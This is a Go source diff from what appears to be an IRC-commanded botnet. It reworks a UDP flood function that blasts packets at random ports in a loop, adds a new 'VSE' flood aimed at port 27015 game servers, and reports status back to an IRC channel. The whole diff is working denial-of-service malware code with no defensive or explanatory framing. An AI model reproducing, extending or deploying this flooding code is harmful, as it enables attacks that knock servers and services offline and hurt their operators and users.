@@ -8,7 +8,6 @@ import (
 	"net/http"
 	"os"
 	"strconv"
-	"time"
 
 	"golang.org/x/net/icmp"
 	"golang.org/x/net/ipv4"
@@ -63,25 +62,34 @@ func POST(postTarget, set_chan string, reportIRC net.Conn) {
 	}
 }
 
-func UDP(udpTarget, size, set_chan string, reportIRC net.Conn) {
+func udp_portCraft(port string) string { return port }
+
+func udp_packetCraft(udpTarget, size, set_chan, port string, reportIRC net.Conn) {
 	_size, _ := strconv.Atoi(size)
 	if _size <= 0 || _size > 700 {
-		IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+
-			"Buffer size must not <= 0 or > 700. Auto Buffer to 700.")
 		_size = 700
 	}
-
-	rand.Seed(time.Now().UnixNano())
 	buffer := make([]byte, _size)
+	udp, err := net.Dial("udp", udpTarget+":"+port)
+	if err != nil {
+		IRC_Report(reportIRC, set_chan, err.Error())
+	}
+	udp.Write(buffer)
+	udp.Close()
+}
 
+func UDP(udpTarget, size, set_chan string, reportIRC net.Conn) {
 	for {
-		udp, err := net.Dial("udp", udpTarget+":"+fmt.Sprint(rand.Intn(65535)))
-		if err != nil {
-			IRC_Report(reportIRC, set_chan, err.Error())
+		udp_packetCraft(udpTarget, size, set_chan, udp_portCraft(fmt.Sprint(rand.Intn(65535))), reportIRC)
+		if DDoS_Switch {
 			break
 		}
-		udp.Write(buffer)
-		udp.Close()
+	}
+}
+
+func VSE(vseTarget, size, set_chan string, reportIRC net.Conn) {
+	for {
+		udp_packetCraft(vseTarget, size, set_chan, udp_portCraft("27015"), reportIRC)
 		if DDoS_Switch {
 			break
 		}
